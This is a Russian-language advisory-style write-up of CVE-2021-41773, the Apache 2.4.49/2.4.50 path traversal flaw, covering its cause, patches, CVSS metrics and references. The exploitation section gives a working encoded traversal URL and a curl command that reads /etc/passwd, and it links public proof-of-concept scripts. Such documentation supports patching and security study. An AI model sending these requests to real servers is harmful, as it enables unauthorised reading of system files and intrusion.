# **CVE-2021-41773**

---

## **Описание**

Возникает в сервере Apache версии **2.4.49** и **2.4.50**. Причиной появления уязвимости является изменение, внесенное в нормализацию пути. Уязвимость позволяет:

- **Прочитать файлы на сервере.**
- В случае неправильной конфигурации — **выполнять удаленное выполнение кода** на сервере.

Уязвимость возникает из-за ошибки в обработке URL-запросов с использованием специальной последовательности (`../`). Эта ошибка позволяет **обойти ограничения**, наложенные на доступ к файловой системе. Если сервер настроен для использования файлов `.htaccess`, уязвимость позволяет получать доступ к файлам **за пределами корневого каталога веб-сервера**.

---

## **Патчи**

- Уязвимость была **криво исправлена** в обновлении **2.4.50** (выпущено **04/10/2021**), из-за чего она также затронула эту версию.
- Полностью устранена в версии **2.4.51** (выпущено **07/10/2021**).

---

## **Метрики**

- **Вектор:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Рейтинг:** **7.5** (Высокий)
- **Уязвимые версии:**
  - `cpe:2.3:a:apache:http_server:2.4.49`
  - `cpe:2.3:a:apache:http_server:2.4.50`
- Версии **до 2.4.49** и **после 2.4.50** — не затронуты.

---

## **Эксплуатация**

### **Условия для успешной эксплуатации**

1. Сервер использует Apache HTTP Server версии **2.4.49** или **2.4.50**.
2. Конфигурация сервера включает директиву: 
    ```apache
    <Directory "/path/to/webroot">
        Require all granted
    </Directory>
    ```
3. Сервер позволяет доступ к CGI-скриптам (например, `/cgi-bin/`).

### **Возможности**

- **Чтение файлов**, находящихся на внутреннем сервере (например, `/etc/passwd`).
- **Удаленное выполнение кода**, если можно загрузить вредоносный файл на сервер.

### **Процесс эксплуатации**

1. Использование URL с кодированием для обхода защиты:

http://ip:port/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

2. С помощью инструмента `curl`:

curl -s --path-as-is "http://iptarget:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

3. Если сервер уязвим, возвращается содержимое файла `/etc/passwd`.

---

## **Материалы**

- [CVE-2021-41773 (cve.mitre.org)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773)
- [NVD CVE-2021-41773 (nist.gov)](https://nvd.nist.gov/vuln/detail/cve-2021-41773)
- [Qualys Blog Post](https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013)
- [Apache HTTP Server Vulnerabilities](https://httpd.apache.org/security/vulnerabilities_24.html)

---

## **Публичные эксплойты**

- [lorddemon PoC](https://github.com/lorddemon/CVE-2021-41773-PoC/blob/main/CVE-2021-41773.py)
- [walnutsecurity PoC](https://github.com/walnutsecurity/cve-2021-41773/blob/main/cve-2021-41773.py)
- [iilegacyyii PoC](https://github.com/iilegacyyii/PoC-CVE-2021-41773/blob/main/CVE-2021-41773.py)
